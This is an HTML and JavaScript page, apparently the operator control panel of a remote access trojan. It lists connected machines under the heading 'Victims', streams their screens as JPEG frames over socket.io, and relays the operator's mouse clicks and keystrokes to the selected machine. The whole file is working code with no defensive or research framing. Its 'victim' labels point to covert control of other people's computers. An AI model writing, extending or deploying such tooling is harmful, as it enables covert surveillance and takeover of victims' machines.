<!DOCTYPE html>
<html>
<head>
  <title>Remote Desktop Viewer</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; background: #111; overflow: hidden; font-family: monospace; }
    body { cursor: none; }
    #screen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      display: block;
      background: #000;
    }

    #cursor {
      position: fixed;
      pointer-events: none;
      z-index: 1000;
      width: 24px; height: 24px;
      border: 2px solid #0f0;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 8px rgba(0,255,0,0.7);
      display: none;
    }
    #cursor::after {
      content: '';
      position: absolute;
      top: 50%; left: 50%;
      width: 2px; height: 2px;
      background: #0f0;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 4px #0f0;
    }

    #info {
      position: fixed; bottom: 6px; right: 6px;
      font-size: 11px; color: #888;
      background: rgba(0,0,0,0.7); padding: 3px 10px;
      border-radius: 3px; pointer-events: none; z-index: 999;
      font-family: monospace; white-space: nowrap;
    }
    #info .coords { color: #ff0; }
    #info.on { color: #4c4; }
    #info.off { color: #c44; }

    #victim-list {
      position: fixed; top: 12px; left: 12px;
      background: rgba(0,0,0,0.8);
      border: 1px solid #333;
      border-radius: 6px;
      padding: 10px;
      z-index: 1001;
      min-width: 220px;
      color: #ddd;
      font-size: 12px;
    }
    #victim-list h3 { color: #0f0; margin-bottom: 6px; font-size: 13px; }
    #victim-list .victim-item {
      padding: 5px 8px;
      margin: 2px 0;
      border-radius: 3px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    #victim-list .victim-item:hover { background: #2a2a2a; }
    #victim-list .victim-item.active { background: #0f02; border: 1px solid #0f08; }
    #victim-list .status-dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: #0f0;
      flex-shrink: 0;
    }
    #victim-list .victim-id { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    #victim-list .victim-res { color: #888; font-size: 10px; }
  </style>
</head>
<body>
  <canvas id="screen"></canvas>
  <div id="cursor"></div>
  <div id="victim-list">
    <h3>Victims</h3>
    <div id="victim-items"></div>
  </div>
  <div id="info">Connecting...</div>

  <script>
    (function() {
      const canvas = document.getElementById('screen');
      const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
      const info = document.getElementById('info');
      const cursorEl = document.getElementById('cursor');
      const victimItems = document.getElementById('victim-items');

      let selectedVictim = null;
      let capW = 1920;
      let capH = 1080;
      let scaleX = 1;
      let scaleY = 1;
      let frameImg = null;
      let frameReady = false;
      let victimList = [];

      const socket = io({
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000
      });

      // Canvas resize
      function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.width = canvas.width + 'px';
        canvas.style.height = canvas.height + 'px';
        scaleX = capW / canvas.width;
        scaleY = capH / canvas.height;
      }
      window.addEventListener('resize', resize);

      // Render loop
      function render() {
        if (frameReady && frameImg) {
          frameReady = false;
          ctx.drawImage(frameImg, 0, 0, canvas.width, canvas.height);
          frameImg = null;
        }
        requestAnimationFrame(render);
      }
      requestAnimationFrame(render);

      // Process JPEG frame
      function processFrame(data) {
        const blob = new Blob([data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = new Image();
        img.onload = function() {
          frameImg = img;
          frameReady = true;
          URL.revokeObjectURL(url);
        };
        img.onerror = function() {
          URL.revokeObjectURL(url);
        };
        img.src = url;
      }

      // Get remote coordinates from mouse event
      function getRemoteCoords(e) {
        const rect = canvas.getBoundingClientRect();
        let cssX = e.clientX - rect.left;
        let cssY = e.clientY - rect.top;
        cssX = Math.max(0, Math.min(cssX, canvas.width));
        cssY = Math.max(0, Math.min(cssY, canvas.height));
        let remoteX = Math.round(cssX * scaleX);
        let remoteY = Math.round(cssY * scaleY);
        remoteX = Math.max(0, Math.min(remoteX, capW - 1));
        remoteY = Math.max(0, Math.min(remoteY, capH - 1));
        return { cssX, cssY, remoteX, remoteY };
      }

      // Move cursor overlay
      function moveCursor(e) {
        const rect = canvas.getBoundingClientRect();
        cursorEl.style.display = 'block';
        cursorEl.style.left = (rect.left + (e.clientX - rect.left)) + 'px';
        cursorEl.style.top = (rect.top + (e.clientY - rect.top)) + 'px';
      }

      // Mouse move
      canvas.addEventListener('mousemove', function(e) {
        moveCursor(e);
        const coords = getRemoteCoords(e);
        info.innerHTML = `${capW}x${capH} &middot; <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
      });

      canvas.addEventListener('mouseleave', function() {
        cursorEl.style.display = 'none';
      });

      // Click
      canvas.addEventListener('click', function(e) {
        if (!selectedVictim) return;
        const coords = getRemoteCoords(e);
        socket.emit('click', { x: coords.remoteX, y: coords.remoteY, btn: 'left' });
        moveCursor(e);
      });

      // Right click
      canvas.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        if (!selectedVictim) return;
        const coords = getRemoteCoords(e);
        socket.emit('click', { x: coords.remoteX, y: coords.remoteY, btn: 'right' });
        moveCursor(e);
      });

      // Keyboard
      document.addEventListener('keydown', function(e) {
        if (!selectedVictim) return;
        const prevent = ['Space', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Tab'];
        if (prevent.includes(e.code) || e.key === ' ') e.preventDefault();
        if (e.key === 'F5' || e.key === 'F12' ||
            (e.ctrlKey && 'rRwWtTnN'.includes(e.key))) return;
        socket.emit('key', e.key);
      });

      // ── Render victim list ──
      function renderVictimList(list) {
        victimList = list;
        victimItems.innerHTML = '';
        if (!list || list.length === 0) {
          victimItems.innerHTML = '<div style="color:#666;padding:4px;">No victims online</div>';
          return;
        }
        list.forEach(v => {
          const item = document.createElement('div');
          item.className = 'victim-item' + (selectedVictim === v.id ? ' active' : '');
          item.innerHTML = `
            <div class="status-dot"></div>
            <div class="victim-id">${v.id}</div>
            <div class="victim-res">${v.w}x${v.h}</div>
          `;
          item.addEventListener('click', function() {
            selectedVictim = v.id;
            socket.emit('select-victim', v.id);
            renderVictimList(victimList);
            info.textContent = `Selecting ${v.id}...`;
          });
          victimItems.appendChild(item);
        });
      }

      // ── Socket events ──
      socket.on('connect', function() {
        info.textContent = 'Connected — registering as viewer';
        info.className = 'on';
        socket.emit('register-viewer');
      });

      socket.on('victim-list', function(list) {
        renderVictimList(list);
      });

      socket.on('victim-info', function(data) {
        capW = data.w;
        capH = data.h;
        resize();
        info.className = 'on';
        info.innerHTML = `${capW}x${capH} &middot; <span class="coords">Viewing ${data.id}</span>`;
      });

      socket.on('frame', function(f) {
        if (f.buf) processFrame(f.buf);
      });

      socket.on('error', function(data) {
        info.textContent = 'Error: ' + (data.msg || 'unknown');
        info.className = 'off';
      });

      socket.on('disconnect', function() {
        info.textContent = 'Disconnected';
        info.className = 'off';
      });

      socket.on('connect_error', function() {
        info.textContent = 'Reconnecting...';
        info.className = 'off';
      });

      resize();
    })();
  </script>
</body>
</html>
